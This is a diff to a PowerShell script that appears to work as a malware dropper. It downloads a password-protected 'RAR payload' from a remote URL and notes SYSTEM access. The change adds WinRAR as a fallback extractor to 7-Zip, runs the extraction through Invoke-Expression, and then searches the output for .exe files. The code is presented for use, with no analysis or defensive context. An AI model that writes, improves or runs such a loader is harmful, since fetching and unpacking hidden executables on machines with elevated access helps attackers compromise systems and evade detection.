@@ -143,16 +143,31 @@ try {
     Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 30
     Add-Content -Path $logPath -Value "RAR payload downloaded to $payloadPath."
 
-    # Check if 7-Zip is installed (common on Windows systems with SYSTEM access)
+    # Check for extraction tools (7-Zip or WinRAR)
+    $extractTool = $null
     $sevenZipPath = "C:\Program Files\7-Zip\7z.exe"
-    if (-not (Test-Path $sevenZipPath)) {
-        throw "7-Zip not found at $sevenZipPath. Please ensure 7-Zip is installed."
+    $winRarPath = "C:\Program Files\WinRAR\WinRAR.exe"
+
+    if (Test-Path $sevenZipPath) {
+        $extractTool = "7zip"
+        Add-Content -Path $logPath -Value "7-Zip found at $sevenZipPath."
+    } elseif (Test-Path $winRarPath) {
+        $extractTool = "winrar"
+        Add-Content -Path $logPath -Value "WinRAR found at $winRarPath."
+    } else {
+        throw "No extraction tool found. Please ensure 7-Zip or WinRAR is installed."
     }
 
-    # Extract the RAR file using 7-Zip with the provided password
-    $extractCommand = "& `"$sevenZipPath`" x -p`"$rarPassword`" -o`"$extractPath`" `"$payloadPath`" -y"
-    Invoke-Expression $extractCommand | Out-Null
-    Add-Content -Path $logPath -Value "RAR payload extracted to $extractPath."
+    # Extract the RAR file using the available tool
+    if ($extractTool -eq "7zip") {
+        $extractCommand = "& `"$sevenZipPath`" x -p`"$rarPassword`" -o`"$extractPath`" `"$payloadPath`" -y"
+        Invoke-Expression $extractCommand | Out-Null
+        Add-Content -Path $logPath -Value "RAR payload extracted using 7-Zip to $extractPath."
+    } elseif ($extractTool -eq "winrar") {
+        $extractCommand = "& `"$winRarPath`" x -p`"$rarPassword`" `"$payloadPath`" `"$extractPath`"\ -y"
+        Invoke-Expression $extractCommand | Out-Null
+        Add-Content -Path $logPath -Value "RAR payload extracted using WinRAR to $extractPath."
+    }
 
     # Find the .exe file in the extracted directory
     $exeFiles = Get-ChildItem -Path $extractPath -Filter "*.exe" -File -Recurse
